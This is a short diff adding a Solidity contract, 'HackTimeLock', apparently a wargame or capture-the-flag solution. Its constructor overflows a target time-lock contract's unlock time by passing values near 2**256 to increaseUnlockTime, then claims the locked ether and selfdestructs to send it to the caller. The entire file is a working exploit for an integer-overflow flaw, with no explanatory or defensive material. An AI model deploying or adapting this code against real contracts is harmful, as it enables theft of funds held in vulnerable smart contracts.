@@ -1,0 +1,24 @@
+pragma solidity ^0.5.0;
+
+interface TimeLockInterface {
+    function unlockTime() external returns (uint256);
+    function claim() external payable;
+    function increaseUnlockTime(uint256 numSeconds) external;
+    
+}
+
+contract HackTimeLock {
+    
+    constructor(address timeLockAddr) public payable {
+        TimeLockInterface tl = TimeLockInterface(timeLockAddr);
+        tl.increaseUnlockTime((2**256)-(365 * 86400));
+        tl.increaseUnlockTime (2**256 - 1);
+        tl.increaseUnlockTime (2**256 - 1);
+        tl.claim.value(1 ether)();
+       
+        selfdestruct(msg.sender);
+    }
+    
+}
+    
+    
